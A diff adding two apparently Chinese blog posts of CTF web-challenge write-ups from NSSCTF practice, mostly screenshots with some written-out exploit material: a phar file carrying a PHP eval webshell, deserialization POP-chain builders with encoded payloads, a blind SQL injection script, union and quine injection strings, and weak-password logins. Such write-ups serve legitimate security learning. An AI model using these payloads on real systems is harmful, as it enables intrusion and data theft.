@@ -172,6 +172,470 @@
         
 
 <div class="post">
+    <a href="/2023/07/15/NSSCTF%E5%88%B7web(2)/">
+        <h2 class="post-title">NSSCTF刷web(2)</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/7/15
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="NISACTF-2022-bingdundun"><a href="#NISACTF-2022-bingdundun" class="headerlink" title="[NISACTF 2022]bingdundun~"></a>[NISACTF 2022]bingdundun~</h1><p><img src="https://img-blog.csdnimg.cn/fcfbefa8fc6b43e88bc8ab789380c630.png" alt="在这里插入图片描述"><br>bingdundun处感觉像文件包含,改upload为index<br>发现确实,猜测会补一个后缀.php<br>那常规文件包含都不行了,这里还有一个文件上传的功能,考虑phar协议</p>
+<pre><code class="php">&lt;?php
+
+$phar = new Phar(&quot;test.phar&quot;);
+$phar-&gt;startBuffering();
+$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER();&quot;);
+$phar-&gt;addFromString(&quot;test.php&quot;,&#39;&lt;?php eval($_GET[1]);?&gt;&#39;);
+$phar-&gt;stopBuffering();
+
+</code></pre>
+<p>生成的phar文件改后缀zip上传</p>
+<h1 id="HDCTF-2023-Welcome-To-HDCTF-2023"><a href="#HDCTF-2023-Welcome-To-HDCTF-2023" class="headerlink" title="[HDCTF 2023]Welcome To HDCTF 2023"></a>[HDCTF 2023]Welcome To HDCTF 2023</h1><p><img src="https://img-blog.csdnimg.cn/9e1a2d4f76354fa19be4b785de232a31.png" alt="在这里插入图片描述"><br>死了也行直接给的</p>
+<h1 id="NISACTF-2022-midlevel"><a href="#NISACTF-2022-midlevel" class="headerlink" title="[NISACTF 2022]midlevel"></a>[NISACTF 2022]midlevel</h1><p>Smarty ssti<br>感觉刚做过<br><img src="https://img-blog.csdnimg.cn/622d365475244f85980b3e0daa619be2.png" alt="在这里插入图片描述"></p>
+<h1 id="GKCTF-2020-cve版签到"><a href="#GKCTF-2020-cve版签到" class="headerlink" title="[GKCTF 2020]cve版签到"></a>[GKCTF 2020]cve版签到</h1><p><img src="https://img-blog.csdnimg.cn/ac21081561f44e3cb04538e76e035ce4.png" alt="在这里插入图片描述"></p>
+<h1 id="GXYCTF-2019-BabyUpload"><a href="#GXYCTF-2019-BabyUpload" class="headerlink" title="[GXYCTF 2019]BabyUpload"></a>[GXYCTF 2019]BabyUpload</h1><p><code>.htaccess</code><br>常规的命令执行函数给ban了<br>用无参rce的方式读一下根目录的文件,看看flag叫什么<br><img src="https://img-blog.csdnimg.cn/3e62688b557249a491105547f81d6eaf.png" alt="在这里插入图片描述"><br><code>scandir(array_rand(array_flip(str_split(set_include_path(dirname(dirname(dirname(getcwd()))))))));</code><br>就叫flag,那直接读<br><img src="https://img-blog.csdnimg.cn/495961a158284b2d8ef8ba8d40e0d7bd.png" alt="在这里插入图片描述"></p>
+<h1 id="NSSCTF-2022-Spring-Recruit-babyphp"><a href="#NSSCTF-2022-Spring-Recruit-babyphp" class="headerlink" title="[NSSCTF 2022 Spring Recruit]babyphp"></a>[NSSCTF 2022 Spring Recruit]babyphp</h1><p><img src="https://img-blog.csdnimg.cn/423f1990d30f4c90a938c6dade1029ad.png" alt="在这里插入图片描述"></p>
+<h1 id="GDOUCTF-2023-EZ-WEB"><a href="#GDOUCTF-2023-EZ-WEB" class="headerlink" title="[GDOUCTF 2023]EZ WEB"></a>[GDOUCTF 2023]EZ WEB</h1><p><img src="https://img-blog.csdnimg.cn/759847eca23f4bcb8c7af6071fd929c7.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/b85d50d60f81481eb6ce88c08b45c91d.png" alt="在这里插入图片描述"></p>
+<h1 id="NISACTF-2022-popchains"><a href="#NISACTF-2022-popchains" class="headerlink" title="[NISACTF 2022]popchains"></a>[NISACTF 2022]popchains</h1><p><img src="https://img-blog.csdnimg.cn/e617debe5b7a4e9cbdeb2f4b5b21d175.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/013ed0616ec3405ca41b40980d909c42.png" alt="在这里插入图片描述"></p>
+<pre><code class="php">&lt;?php
+
+
+if(isset($_GET[&#39;wish&#39;]))&#123;
+    @unserialize($_GET[&#39;wish&#39;]);
+&#125;
+
+
+class Road_is_Long&#123;
+    public $page;
+    public $string;
+    public function __construct($file=&#39;index.php&#39;)&#123;
+        $this-&gt;page = $file;
+    &#125;
+    public function __toString()&#123;// 3
+        return $this-&gt;string-&gt;page;
+    &#125;
+
+    public function __wakeup()&#123;
+        if(preg_match(&quot;/file|ftp|http|https|gopher|dict|\.\./i&quot;, $this-&gt;page)) &#123;// 4
+            echo &quot;You can Not Enter 2022&quot;;
+            $this-&gt;page = &quot;index.php&quot;;
+        &#125;
+    &#125;
+&#125;
+
+class Try_Work_Hard&#123;
+    protected  $var;
+    public function __construct($var)&#123;
+        $this -&gt; var = $var;
+    &#125;
+    public function append($value)&#123;// 0
+        include($value);
+    &#125;
+    public function __invoke()&#123;
+        $this-&gt;append($this-&gt;var);// 1
+    &#125;
+&#125;
+
+class Make_a_Change&#123;
+    public $effort;
+    public function __construct()&#123;
+        $this-&gt;effort = array();
+    &#125;
+
+    public function __get($key)&#123;// 2
+        $function = $this-&gt;effort;
+        return $function();
+    &#125;
+&#125;
+$p = new Road_is_Long();
+$R = new Road_is_Long();
+$p -&gt; page = $R;
+$M = new Make_a_Change();
+$R -&gt; string = $M;
+$T =new Try_Work_Hard(&#39;/flag&#39;);
+$M -&gt; effort = $T;
+echo urlencode(serialize($p)).&quot;\n&quot;;
+</code></pre>
+<p><code>O%3A12%3A%22Road_is_Long%22%3A2%3A%7Bs%3A4%3A%22page%22%3BO%3A12%3A%22Road_is_Long%22%3A2%3A%7Bs%3A4%3A%22page%22%3Bs%3A9%3A%22index.php%22%3Bs%3A6%3A%22string%22%3BO%3A13%3A%22Make_a_Change%22%3A1%3A%7Bs%3A6%3A%22effort%22%3BO%3A13%3A%22Try_Work_Hard%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A5%3A%22%2Fflag%22%3B%7D%7D%7Ds%3A6%3A%22string%22%3BN%3B%7D</code></p>
+<h1 id="CISCN-2019华北Day2-Web1"><a href="#CISCN-2019华北Day2-Web1" class="headerlink" title="[CISCN 2019华北Day2]Web1"></a>[CISCN 2019华北Day2]Web1</h1><pre><code class="python">import requests
+
+url = &#39;http://node2.anna.nssctf.cn:28640//index.php&#39;
+
+flag = &#39;&#39;
+
+for i in range(1, 100):
+    s = 33
+    e = 130
+    mid = (e + s)&gt;&gt;1
+    while True:
+        payload = &#123;
+            &#39;id&#39;: &#39;if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)&#39;.format(i, mid)
+        &#125;
+        res = requests.post(url=url, data=payload).text
+
+        if &#39;Hello, glzjin wants a girlfriend.&#39; in res:
+            s = mid
+        else:
+            e = mid
+        mid = (e + s)&gt;&gt;1
+        if (e-s) &lt;= 1:
+            flag += chr(e)
+            print(flag)
+            break
+    if &#39;&#125;&#39; in flag:
+        break
+</code></pre>
+<h1 id="NSSRound-1-Basic-basic-check"><a href="#NSSRound-1-Basic-basic-check" class="headerlink" title="[NSSRound#1 Basic]basic_check"></a>[NSSRound#1 Basic]basic_check</h1><p>无从下手,看wp是说允许PUT可以直接写马<br><img src="https://img-blog.csdnimg.cn/b23f31592e46403ca25f067fe8b97a8a.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/60c61275b42c4f2d902bb31c99612130.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/e48250195d414cfc8cfde8357367928f.png" alt="在这里插入图片描述"></p>
+<h1 id="HCTF-2018-Warmup"><a href="#HCTF-2018-Warmup" class="headerlink" title="[HCTF 2018]Warmup"></a>[HCTF 2018]Warmup</h1><p><img src="https://img-blog.csdnimg.cn/59b8abc8086a43cd8d0338f24f19de24.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/0140f605478347d08595feaf1142488f.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/12ace42650064e23b183f01c31d409c5.png" alt="在这里插入图片描述"></p>
+<h1 id="HNCTF-2022-Week1-2048"><a href="#HNCTF-2022-Week1-2048" class="headerlink" title="[HNCTF 2022 Week1]2048"></a>[HNCTF 2022 Week1]2048</h1><p><img src="https://img-blog.csdnimg.cn/a9810f40fb934128a8e0202a9f602048.png" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/bbbf25cf69f643e08b473c1afe647a64.png" alt="在这里插入图片描述"></p>
+<h1 id="LitCTF-2023-Http-pro-max-plus"><a href="#LitCTF-2023-Http-pro-max-plus" class="headerlink" title="[LitCTF 2023]Http pro max plus"></a>[LitCTF 2023]Http pro max plus</h1><p><img src="https://img-blog.csdnimg.cn/842cf49bee3d44f1abdaaeb175a31ee0.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/251100715b4c485790d314dfd1325dfa.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/351b04e9d3084c9e9bf162fc3f9d974f.png" alt="在这里插入图片描述"></p>
+<h1 id="GDOUCTF-2023-泄露的伪装"><a href="#GDOUCTF-2023-泄露的伪装" class="headerlink" title="[GDOUCTF 2023]泄露的伪装"></a>[GDOUCTF 2023]泄露的伪装</h1><p><img src="https://img-blog.csdnimg.cn/b5fc2d1674bc4a36ab2759007db46b62.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/1e2874bcc76443d282bf28026bb226b5.png" alt="在这里插入图片描述"></p>
+<h1 id="HNCTF-2022-Week1-Interesting-include"><a href="#HNCTF-2022-Week1-Interesting-include" class="headerlink" title="[HNCTF 2022 Week1]Interesting_include"></a>[HNCTF 2022 Week1]Interesting_include<img src="https://img-blog.csdnimg.cn/d0e5c8e194814738bee65c7a7c3d2299.png" alt="在这里插入图片描述"></h1><h1 id="第五空间-2021-pklovecloud"><a href="#第五空间-2021-pklovecloud" class="headerlink" title="[第五空间 2021]pklovecloud"></a>[第五空间 2021]pklovecloud</h1><p><img src="https://img-blog.csdnimg.cn/638f52a6be6c44d7b18ff4afc3c62036.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/a6f642ee2dbd448095b73f797e53b634.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/71ad4e4f2f224d57ac1809f40758ce54.png" alt="在这里插入图片描述"></p>
+<pre><code class="php">&lt;?php  
+include &#39;flag.php&#39;;
+class pkshow 
+&#123;  
+    function echo_name()     
+    &#123;          
+        return &quot;Pk very safe^.^&quot;;      
+    &#125;  
+&#125; 
+
+class acp 
+&#123;   
+    protected $cinder;  
+    public $neutron;
+    public $nova;
+    function __construct($p) 
+    &#123;      
+        $this-&gt;cinder = $p;
+    &#125;  
+    function __toString()      
+    &#123;          
+        if (isset($this-&gt;cinder))  
+            return $this-&gt;cinder-&gt;echo_name();      
+    &#125;  
+&#125;  
+
+class ace
+&#123;    
+    public $filename;     
+    public $openstack;
+    public $docker; 
+    public function __construct()&#123;
+        $this-&gt;filename = &#39;../../../../../nssctfasdasdflag&#39;;
+    &#125;
+    function echo_name()      
+    &#123;   
+        $this-&gt;openstack = unserialize($this-&gt;docker);
+        $this-&gt;openstack-&gt;neutron = $heat;
+        if($this-&gt;openstack-&gt;neutron === $this-&gt;openstack-&gt;nova)
+        &#123;
+        $file = &quot;./&#123;$this-&gt;filename&#125;&quot;;
+            if (file_get_contents($file))         
+            &#123;              
+                return file_get_contents($file); 
+            &#125;  
+            else 
+            &#123; 
+                return &quot;keystone lost~&quot;; 
+            &#125;    
+        &#125;
+    &#125;  
+&#125;
+
+$ACE = new ace();
+$pop = new acp($ACE);
+
+echo urlencode(serialize($pop));
+</code></pre>
+<h1 id="鹤城杯-2021-Middle-magic"><a href="#鹤城杯-2021-Middle-magic" class="headerlink" title="[鹤城杯 2021]Middle magic"></a>[鹤城杯 2021]Middle magic</h1><p><img src="https://img-blog.csdnimg.cn/3d97e1d7481e4789983ed02fd19c2429.png" alt="在这里插入图片描述"></p>
+<h1 id="GKCTF-2021-easycms"><a href="#GKCTF-2021-easycms" class="headerlink" title="[GKCTF 2021]easycms"></a>[GKCTF 2021]easycms</h1><p><img src="https://img-blog.csdnimg.cn/0064ffef65db404d88859354785edf04.png" alt="在这里插入图片描述"></p>
+<p>弱口令 admin 12345<br><img src="https://img-blog.csdnimg.cn/1f2119773bf84cbaab13bd06cdc8a0b4.png" alt="在这里插入图片描述"><br>蝉知7.7网上找漏洞<br>然后尝试复现,我当时做的时候可以执行whoami,当时没做完干别的去了,过几天回来做又不能复现rce的漏洞了<br>那就和别人wp里写的一样任意文件下载</p>
+<p><code>?m=ui&amp;f=downloadtheme&amp;theme=L2ZsYWc=</code></p>
+<h1 id="SWPUCTF-2022-新生赛-ez-rce"><a href="#SWPUCTF-2022-新生赛-ez-rce" class="headerlink" title="[SWPUCTF 2022 新生赛]ez_rce"></a>[SWPUCTF 2022 新生赛]ez_rce</h1><p><img src="https://img-blog.csdnimg.cn/3a72829bde234c38957f6d45ad6c57fe.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/c7b9700a617641a3824f9670e7b03bb6.png" alt="在这里插入图片描述"><br>getshell<img src="https://img-blog.csdnimg.cn/8390e1f8611d4805bdbd48106880fbac.png" alt="在这里插入图片描述"></p>
+<p>直接读flag读不到<br>搜一下flag<br><code>find / -name &quot;flag&quot;</code><br><img src="https://img-blog.csdnimg.cn/889d34047ea94fd985bb799105510811.png" alt="在这里插入图片描述"><br><code>find / -name &quot;flag&quot; -type f -exec cat &#123;&#125; \;</code><br><img src="https://img-blog.csdnimg.cn/cb89a1b37ded4acfa4b228bb31467254.png" alt="在这里插入图片描述"></p>
+<h1 id="羊城杯-2020-easycon"><a href="#羊城杯-2020-easycon" class="headerlink" title="[羊城杯 2020]easycon"></a>[羊城杯 2020]easycon</h1><p><img src="https://img-blog.csdnimg.cn/65cc535c6da441c88368f5b6926bd7f7.png" alt="在这里插入图片描述"><br>base64解码得到flag<br><img src="https://img-blog.csdnimg.cn/5f1aa86fb71b4af2a5ec83d90c0960d7.png" alt="在这里插入图片描述"></p>
+<h1 id="LitCTF-2023-这是什么？SQL-！注一下-！"><a href="#LitCTF-2023-这是什么？SQL-！注一下-！" class="headerlink" title="[LitCTF 2023]这是什么？SQL ！注一下 ！"></a>[LitCTF 2023]这是什么？SQL ！注一下 ！</h1><p><code>-1))))))union select 1,group_concat(flag)from ctftraining.flag%23</code></p>
+<h1 id="第五空间-2021-yet-another-mysql-injection"><a href="#第五空间-2021-yet-another-mysql-injection" class="headerlink" title="[第五空间 2021]yet_another_mysql_injection"></a>[第五空间 2021]yet_another_mysql_injection</h1><p>admin admin 爆hacker<br>然后我在这手工测了一会 没什么思路<br>右键看源码<br>然后跟进<code>/?source</code><br><img src="https://img-blog.csdnimg.cn/62eef944ea5f4ba7b7e0f05d2d7da428.png"><br>意思是传的password和查询的password要相同  quine注入</p>
+<pre><code class="c">1&#39;/**/union/**/select/**/replace(replace(&#39;1&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;,char(34),char(39)),char(46),&#39;1&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;)#
+</code></pre>
+<p>看wp发现第二种做法<br>phpmyadmin<br>弱口令 admin admin<br><img src="https://img-blog.csdnimg.cn/519bfe00a4d84aa297aeeab283e1e54d.png" alt="在这里插入图片描述"><br> 登录就行了</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00a596">网络安全</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">安全</a>
+        </span>
+        
+    </div>
+    <a href="/2023/07/15/NSSCTF%E5%88%B7web(2)/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2023/06/19/NSS%E5%88%B7web(1)/">
+        <h2 class="post-title">NSS刷web(1)</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/6/19
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p>一点点做,简单的也不跳了,就当回忆知识了</p>
+<h1 id="SWPUCTF-2021-新生赛-gift-F12"><a href="#SWPUCTF-2021-新生赛-gift-F12" class="headerlink" title="[SWPUCTF 2021 新生赛]gift_F12"></a>[SWPUCTF 2021 新生赛]gift_F12</h1><p>ctrl+u <img src="https://img-blog.csdnimg.cn/ec6cf591aa2d46029b3fd0fa228d8961.png" alt="在这里插入图片描述"></p>
+<h1 id="SWPUCTF-2021-新生赛-jicao"><a href="#SWPUCTF-2021-新生赛-jicao" class="headerlink" title="[SWPUCTF 2021 新生赛]jicao"></a>[SWPUCTF 2021 新生赛]jicao</h1><p><img src="https://img-blog.csdnimg.cn/d6def4918e124c65943cef64622c75f3.png" alt="在这里插入图片描述"></p>
+<h1 id="SWPUCTF-2021-新生赛-easy-md5"><a href="#SWPUCTF-2021-新生赛-easy-md5" class="headerlink" title="[SWPUCTF 2021 新生赛]easy_md5"></a>[SWPUCTF 2021 新生赛]easy_md5</h1><p><img src="https://img-blog.csdnimg.cn/94467f3d469c41a0a13ba811984270ab.png" alt="在这里插入图片描述"></p>
+<h1 id="SWPUCTF-2021-新生赛-easy-sql"><a href="#SWPUCTF-2021-新生赛-easy-sql" class="headerlink" title="[SWPUCTF 2021 新生赛]easy_sql"></a>[SWPUCTF 2021 新生赛]easy_sql</h1><p><img src="https://img-blog.csdnimg.cn/dcda7e85b5444b639bd5c0d76b94121f.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/ce823b230e14468f93040ff7b83b1363.png" alt="在这里插入图片描述"></p>
+<h1 id="SWPUCTF-2021-新生赛-include"><a href="#SWPUCTF-2021-新生赛-include" class="headerlink" title="[SWPUCTF 2021 新生赛]include"></a>[SWPUCTF 2021 新生赛]include</h1><p><img src="https://img-blog.csdnimg.cn/16c43907d7c647fca6c90647c7e5eccf.png" alt="在这里插入图片描述"></p>
+<h1 id="SWPUCTF-2021-新生赛-easyrce"><a href="#SWPUCTF-2021-新生赛-easyrce" class="headerlink" title="[SWPUCTF 2021 新生赛]easyrce"></a>[SWPUCTF 2021 新生赛]easyrce</h1><p><img src="https://img-blog.csdnimg.cn/5cca341da20e4a96be98a324bc27b521.png" alt="在这里插入图片描述"></p>
+<h1 id="SWPUCTF-2021-新生赛-caidao"><a href="#SWPUCTF-2021-新生赛-caidao" class="headerlink" title="[SWPUCTF 2021 新生赛]caidao"></a>[SWPUCTF 2021 新生赛]caidao</h1><p><img src="https://img-blog.csdnimg.cn/df7cbcdcdbc74d0a9162ab07cbf470a4.png" alt="在这里插入图片描述"></p>
+<h1 id="SWPUCTF-2021-新生赛-babyrce"><a href="#SWPUCTF-2021-新生赛-babyrce" class="headerlink" title="[SWPUCTF 2021 新生赛]babyrce"></a>[SWPUCTF 2021 新生赛]babyrce</h1><p><img src="https://img-blog.csdnimg.cn/4551cade11554146aeddae03e0232689.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/90298a09dd6a44b08006dbdd85590f46.png" alt="在这里插入图片描述"></p>
+<h1 id="SWPUCTF-2021-新生赛-Do-you-know-http"><a href="#SWPUCTF-2021-新生赛-Do-you-know-http" class="headerlink" title="[SWPUCTF 2021 新生赛]Do_you_know_http"></a>[SWPUCTF 2021 新生赛]Do_you_know_http</h1><p>改ua xff<br><img src="https://img-blog.csdnimg.cn/2a569e75c41d4da5b12b4b98bed30a67.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/98ffcbd8907740a1971a51213e56a1f9.png" alt="在这里插入图片描述"></p>
+<h1 id="SWPUCTF-2021-新生赛-ez-unserialize"><a href="#SWPUCTF-2021-新生赛-ez-unserialize" class="headerlink" title="[SWPUCTF 2021 新生赛]ez_unserialize"></a>[SWPUCTF 2021 新生赛]ez_unserialize<img src="https://img-blog.csdnimg.cn/baf376b1d805427188d5bccf194b369e.png" alt="在这里插入图片描述"></h1><p>访问robots.txt<br><img src="https://img-blog.csdnimg.cn/546fcc7a5d324dbd9133f1261b98dfeb.png" alt="在这里插入图片描述"></p>
+<pre><code class="php">&lt;?php
+class wllm&#123;
+
+    public $admin;
+    public $passwd;
+
+    public function __construct()&#123;
+        $this-&gt;admin =&quot;admin&quot;;
+        $this-&gt;passwd = &quot;ctf&quot;;
+    &#125;
+
+        public function __destruct()&#123;
+        if($this-&gt;admin === &quot;admin&quot; &amp;&amp; $this-&gt;passwd === &quot;ctf&quot;)&#123;
+            include(&quot;flag.php&quot;);
+            echo $flag;
+        &#125;else&#123;
+            echo $this-&gt;admin;
+            echo $this-&gt;passwd;
+            echo &quot;Just a bit more!&quot;;
+        &#125;
+    &#125;
+&#125;
+
+$p = new wllm();
+echo serialize($p);
+//O:4:&quot;wllm&quot;:2:&#123;s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:3:&quot;ctf&quot;;&#125;
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/fad133c67b7c4e76bb6a123944a17dde.png" alt="在这里插入图片描述"></p>
+<h1 id="SWPUCTF-2021-新生赛-easyupload2-0"><a href="#SWPUCTF-2021-新生赛-easyupload2-0" class="headerlink" title="[SWPUCTF 2021 新生赛]easyupload2.0"></a>[SWPUCTF 2021 新生赛]easyupload2.0</h1><p><code>传phtml</code><br><img src="https://img-blog.csdnimg.cn/ac140182b45d4f5aa6f87151b6d2f3f5.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/893bf684d1fc4942a9153765fa33b658.png" alt="在这里插入图片描述"></p>
+<h1 id="SWPUCTF-2021-新生赛-easyupload1-0"><a href="#SWPUCTF-2021-新生赛-easyupload1-0" class="headerlink" title="[SWPUCTF 2021 新生赛]easyupload1.0"></a>[SWPUCTF 2021 新生赛]easyupload1.0</h1><p>改mime<br><img src="https://img-blog.csdnimg.cn/de6a146a5bfd4bd6911aaf8b48116d86.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/cdfad6a061e642cdad51581cc54b7545.png" alt="在这里插入图片描述"></p>
+<h1 id="SWPUCTF-2021-新生赛-no-wakeup"><a href="#SWPUCTF-2021-新生赛-no-wakeup" class="headerlink" title="[SWPUCTF 2021 新生赛]no_wakeup"></a>[SWPUCTF 2021 新生赛]no_wakeup</h1><p>绕过wakeup<br>低版本php可以让序列化中属性的个数与实际不符来绕过</p>
+<pre><code class="php">&lt;?php
+
+class HaHaHa&#123;
+
+
+        public $admin;
+        public $passwd;
+
+        public function __construct()&#123;
+            $this-&gt;admin =&quot;admin&quot;;
+            $this-&gt;passwd = &quot;wllm&quot;;
+        &#125;
+
+        public function __wakeup()&#123;
+            $this-&gt;passwd = sha1($this-&gt;passwd);
+        &#125;
+
+        public function __destruct()&#123;
+            if($this-&gt;admin === &quot;admin&quot; &amp;&amp; $this-&gt;passwd === &quot;wllm&quot;)&#123;
+                include(&quot;flag.php&quot;);
+                echo $flag;
+            &#125;else&#123;
+                echo $this-&gt;passwd;
+                echo &quot;No wake up&quot;;
+            &#125;
+        &#125;
+    &#125;
+
+$p = new HaHaHa();
+echo serialize($p);
+
+</code></pre>
+<p>生成的序列化值<br><code>O:6:&quot;HaHaHa&quot;:2:&#123;s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:4:&quot;wllm&quot;;&#125;</code><br>手动改完<br><code>O:6:&quot;HaHaHa&quot;:3:&#123;s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:4:&quot;wllm&quot;;&#125;</code><br><img src="https://img-blog.csdnimg.cn/5a67dbe43571481a951fd5ce0999c857.png" alt="在这里插入图片描述"></p>
+<h1 id="suctf-2019-EasySQL"><a href="#suctf-2019-EasySQL" class="headerlink" title="[suctf 2019]EasySQL"></a>[suctf 2019]EasySQL</h1><p>我是做不出来的奥<br>这种sql语句写的属于是第一次见<br>exp<code>*,1</code></p>
+<h1 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h1><p>读useless源码<br><img src="https://img-blog.csdnimg.cn/ea803beaea74445b80f8bad792adf433.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/c956aef1b3c543069cbda0f73a6db29c.png" alt="在这里插入图片描述"></p>
+<pre><code class="php">
+&lt;?php  
+
+class Flag&#123;  //flag.php  
+    public $file = &#39;flag.php&#39;;  
+    public function __tostring()&#123;  
+        if(isset($this-&gt;file))&#123;  
+            echo file_get_contents($this-&gt;file); 
+            echo &quot;&lt;br&gt;&quot;;
+        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);
+        &#125;  
+    &#125;  
+&#125;  
+$p = new Flag();
+echo serialize($p);
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/a632a17179f44aae9cbdc9adf3e83bf3.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/f7db0893033446a19f6a3928b4ab422a.png" alt="在这里插入图片描述"></p>
+<h1 id="第五空间-2021-WebFTP"><a href="#第五空间-2021-WebFTP" class="headerlink" title="[第五空间 2021]WebFTP"></a>[第五空间 2021]WebFTP</h1><p>扫目录 存在phpinfo.php<br><img src="https://img-blog.csdnimg.cn/a76da7262e0f4a42b9be978e6cfe57d3.png" alt="在这里插入图片描述"></p>
+<h1 id="BJDCTF-2020-easy-md5"><a href="#BJDCTF-2020-easy-md5" class="headerlink" title="[BJDCTF 2020]easy_md5"></a>[BJDCTF 2020]easy_md5</h1><p>这题是学骚操作的</p>
+<p>开局一个框,啥都没了<br><img src="https://img-blog.csdnimg.cn/7518f6112d0e4730998b67c97bd67b59.png" alt="扫一下"><br>php中md5第二个参数传true会转原始二进制,输入<code>ffifdyop</code><br><img src="https://img-blog.csdnimg.cn/496446475f1d4e20ac5832f7d5a26c81.png" alt="在这里插入图片描述"><br>相当于<code>select * from &#39;admin&#39; where password=&#39;&#39;or&#39;6&#39;</code><br>传参后看源码<br><img src="https://img-blog.csdnimg.cn/834f99fbe7f7433f96c6cfd7f811b822.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/fad89123783a437e89e2a930e6888943.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/8a13d71c553c496da90a7e0954368460.png" alt="在这里插入图片描述"></p>
+<h1 id="SWPUCTF-2021-新生赛-PseudoProtocols"><a href="#SWPUCTF-2021-新生赛-PseudoProtocols" class="headerlink" title="[SWPUCTF 2021 新生赛]PseudoProtocols"></a>[SWPUCTF 2021 新生赛]PseudoProtocols</h1><p><img src="https://img-blog.csdnimg.cn/7516b266d8e444419b5ad1b1ca10e2e4.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/4d37f737d82f4252be3cb0172cb605cd.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/ca44263967754fdfb5e919b864aa0d98.png" alt="在这里插入图片描述"></p>
+<h1 id="NISACTF-2022-easyssrf"><a href="#NISACTF-2022-easyssrf" class="headerlink" title="[NISACTF 2022]easyssrf"></a>[NISACTF 2022]easyssrf</h1><p><code>http://127.0.0.1/flag.php</code><br>返回提示&#x2F;fl4g<br><img src="https://img-blog.csdnimg.cn/60c1d9277df54336ae7753f8b7204d74.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/010bdd5269b646ec9985ac62a7fc870f.png" alt="在这里插入图片描述"></p>
+<h1 id="SWPUCTF-2021-新生赛-hardrce"><a href="#SWPUCTF-2021-新生赛-hardrce" class="headerlink" title="[SWPUCTF 2021 新生赛]hardrce"></a>[SWPUCTF 2021 新生赛]hardrce</h1><p><img src="https://img-blog.csdnimg.cn/9a1cb146043e478b8a01ebd80a082f75.png" alt="在这里插入图片描述"></p>
+<h1 id="SWPUCTF-2021-新生赛-error"><a href="#SWPUCTF-2021-新生赛-error" class="headerlink" title="[SWPUCTF 2021 新生赛]error"></a>[SWPUCTF 2021 新生赛]error</h1><p><img src="https://img-blog.csdnimg.cn/a613640232554dfbaaf5c161fe5ea2de.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/9f19231344fe4f0f899e21bcd50a8b04.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/9bb3720b63fc47cba88368068117a5d7.png" alt="在这里插入图片描述"></p>
+<h1 id="SWPUCTF-2021-新生赛-easyupload3-0"><a href="#SWPUCTF-2021-新生赛-easyupload3-0" class="headerlink" title="[SWPUCTF 2021 新生赛]easyupload3.0"></a><strong>[SWPUCTF 2021 新生赛]easyupload3.0</strong></h1><p><img src="https://img-blog.csdnimg.cn/e514b36c964e466ca687dbae110729b3.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/0142c48c39634b78bd6fb91a0a5f998f.png" alt="在这里插入图片描述"></p>
